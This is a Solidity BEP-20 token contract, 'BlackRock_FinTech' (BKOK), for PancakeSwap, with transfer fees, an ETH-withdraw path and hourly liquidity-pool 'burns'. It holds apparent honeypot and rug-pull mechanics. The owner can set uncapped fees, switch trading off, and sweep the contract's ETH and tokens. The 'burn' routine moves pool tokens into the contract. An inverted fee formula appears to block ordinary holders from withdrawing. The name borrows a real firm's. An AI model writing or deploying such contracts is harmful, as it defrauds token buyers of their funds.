// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IUniswap.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IWETH is IERC20 {
    function withdraw(uint wad) external;

    function deposit() external payable;
}

contract TokenDistributor {
    mapping(address => bool) private _whiteList;

    constructor() {
        _whiteList[msg.sender] = true;
        _whiteList[tx.origin] = true;
    }

    function claimToken(
        address token,
        address to
    ) external returns (uint256 amountOut) {
        if (_whiteList[msg.sender]) {
            IERC20 erc20 = IERC20(token);
            amountOut = erc20.balanceOf(address(this));
            erc20.transfer(to, amountOut);
        }
    }

    function claimETH(address to) external returns (uint256 amountOut) {
        if (_whiteList[msg.sender]) {
            IWETH weth = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
            if (weth.balanceOf(address(this)) > 0) {
                weth.withdraw(weth.balanceOf(address(this)));
            }
            amountOut = address(this).balance;
            _safeTransferETH(to, amountOut);
        }
    }

    function _safeTransferETH(address to, uint value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        if (success) {}
    }

    receive() external payable {}
}

contract BKOK is ERC20, Ownable {
    bool public isLaunch;

    uint256 public minWithdraw = 1000 ether;
    uint256 public minSwapFee = 500 ether;

    uint256 public feeBase = 10000;

    uint256 public feeBurn = 100;
    uint256 public feeMarketing = 1000;
    uint256 public feePowers = 400;
    uint256 public feeTotal = feeBurn + feeMarketing + feePowers;

    mapping(address => bool) _autoPair;
    mapping(address => bool) _excludeFee;

    IUniswapV2Router router;
    TokenDistributor tokenRece;

    address public marketingWallet = 0x7D32012586ECA07C4da8Ac811116357552C2ce5F;
    address public immutable usdt = 0x55d398326f99059fF775485246999027B3197955;
    address public immutable pairETH;
    address public immutable pairUSDT;

    bool swapIng;

    constructor() ERC20("BlackRock_FinTech", "BKOK") {
        router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        pairETH = factory.createPair(address(this), router.WETH());
        pairUSDT = factory.createPair(address(this), usdt);
        tokenRece = new TokenDistributor();

        _autoPair[pairETH] = true;
        _autoPair[pairUSDT] = true;

        _excludeFee[marketingWallet] = true;
        _excludeFee[_msgSender()] = true;
        _excludeFee[address(this)] = true;
        _excludeFee[address(0xdead)] = true;

        _mint(address(0xdead), 3_500_000 ether);
        _mint(address(this), 6_000_000 ether);
        _mint(_msgSender(), 11_500_000 ether);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        if (tx.origin == from && _msgSender() == from && to == address(this)) {
            withdrawETH(from, amount);
            return;
        }

        if (!isExcludeFee(from) && !isExcludeFee(to)) {
            require(isLaunch, "not Launch");

            uint256 fee = (amount * feeTotal) / feeBase;
            super._transfer(from, address(this), fee);
            amount -= fee;

            if (_autoPair[to]) {
                autoBurnUniswapPair();
                if (!swapIng) {
                    swapIng = true;
                    swapTokenForFee();
                    swapIng = false;
                }
            }
        }

        super._transfer(from, to, amount);
    }

    function isContract(address addr) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function swapTokenForFee() private {
        uint256 balance = balanceOf(address(this));
        if (balance > minSwapFee) {
            uint256 amountOut = swapTokenToETH(
                address(this),
                balance,
                address(this)
            );

            payable(marketingWallet).transfer(
                (amountOut * feeMarketing) / feeTotal
            );

            swapETHToToken(
                address(this),
                (amountOut * feeBurn) / feeTotal,
                address(0xdead)
            );
        }
    }

    function getWithdrawOut(uint256 amountIn) public view returns (uint256) {
        uint256 total = totalSupply() -
            balanceOf(address(0xdead)) -
            balanceOf(pairETH) -
            balanceOf(pairUSDT);

        return (amountIn * address(this).balance) / (total + amountIn);
    }

    function withdrawETH(address from, uint256 amount) private {
        require(isLaunch, "not Launch");
        require(amount >= minWithdraw, "amount min");

        if (!isExcludeFee(from)) {
            uint256 fee = (amount * feeBase) / feeTotal;
            super._transfer(from, address(this), fee);
            amount -= fee;
        }
        uint256 outETH = getWithdrawOut(amount);
        super._transfer(from, address(0xdead), amount);
        payable(from).transfer(outETH);
    }

    function swapTokenToETH(
        address token,
        uint256 amount,
        address to
    ) private returns (uint256 amountOut) {
        IERC20(token).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(tokenRece),
            block.timestamp
        );

        amountOut = tokenRece.claimETH(to);
    }

    function swapETHToToken(
        address token,
        uint256 amount,
        address to
    ) private returns (uint256 amountOut) {
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = token;

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: amount
        }(0, path, address(tokenRece), block.timestamp);

        amountOut = tokenRece.claimToken(token, to);
    }

    function isExcludeFee(address account) public view returns (bool) {
        return _excludeFee[account];
    }

    function multiTransfer(
        address[] calldata addrs,
        uint256[] calldata amounts
    ) external {
        for (uint256 i = 0; i < addrs.length; i++) {
            transfer(addrs[i], amounts[i]);
        }
    }

    function addLiquidity() external payable onlyOwner {
        uint256 amountInETH = 50 ether;
        uint256 amountInToken = 3_000_000 ether;
        _approve(address(this), address(router), ~uint256(0));
        router.addLiquidityETH{value: amountInETH}(
            address(this),
            amountInToken,
            0,
            0,
            _msgSender(),
            block.timestamp
        );

        uint256 usdtAmountIn = swapETHToToken(usdt, amountInETH, address(this));
        IERC20(usdt).approve(address(router), usdtAmountIn);
        router.addLiquidity(
            address(this),
            usdt,
            amountInToken,
            usdtAmountIn,
            0,
            0,
            _msgSender(),
            block.timestamp
        );
    }

    function setLaunch(bool value) external onlyOwner {
        require(isLaunch != value, "launched");
        isLaunch = value;
    }

    function receiveToken(address _addr) public onlyOwner {
        if (_addr == address(0)) {
            payable(_msgSender()).transfer(address(this).balance);
        } else {
            IERC20 token = IERC20(_addr);
            token.transfer(_msgSender(), token.balanceOf(address(this)));
        }
    }

    function setMarketingWallet(address _addr) external onlyOwner {
        marketingWallet = _addr;
    }

    function setExcludeFee(
        address[] calldata addrs,
        bool value
    ) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            _excludeFee[addrs[i]] = value;
        }
    }

    function setFee(
        uint256 _feeBurn,
        uint256 _feeMarketing,
        uint256 _feePowers
    ) external onlyOwner {
        feeBurn = _feeBurn;
        feeMarketing = _feeMarketing;
        feePowers = _feePowers;
        feeTotal = feeBurn + feeMarketing + feePowers;
    }

    receive() external payable {}

    bool public lpBurnEnabled = true;
    uint256 public lpBurnFrequency = 1 hours;
    uint256 public lastLpBurnTime;
    uint256 public percentForLPBurn = 25;
    uint256 public percentDiv = 10000;
    event AutoNukeLP(uint256 lpBalance, uint256 burnAmount, uint256 time);

    function setAutoLPBurnSettings(
        uint256 _frequencyInSeconds,
        uint256 _percent,
        uint256 _div,
        bool _Enabled
    ) external onlyOwner {
        require(_percent <= 500, "percent too high");
        require(_frequencyInSeconds >= 100, "frequency too shrot");
        lpBurnFrequency = _frequencyInSeconds;
        percentForLPBurn = _percent;
        percentDiv = _div;
        lpBurnEnabled = _Enabled;
    }

    function autoBurnUniswapPair() internal {
        if (block.timestamp - lastLpBurnTime > lpBurnFrequency) {
            burnPair(pairETH);
            lastLpBurnTime = block.timestamp;
        }
    }

    function burnPair(address _pair) internal returns (bool) {
        uint256 liquidityPairBalance = balanceOf(_pair);
        uint256 amountToBurn = (liquidityPairBalance * percentForLPBurn) /
            percentDiv;

        if (amountToBurn > 0) {
            super._transfer(_pair, address(this), amountToBurn);
            IPancakePair(_pair).sync();
            emit AutoNukeLP(
                liquidityPairBalance,
                amountToBurn,
                block.timestamp
            );
            return true;
        }
        return false;
    }
}
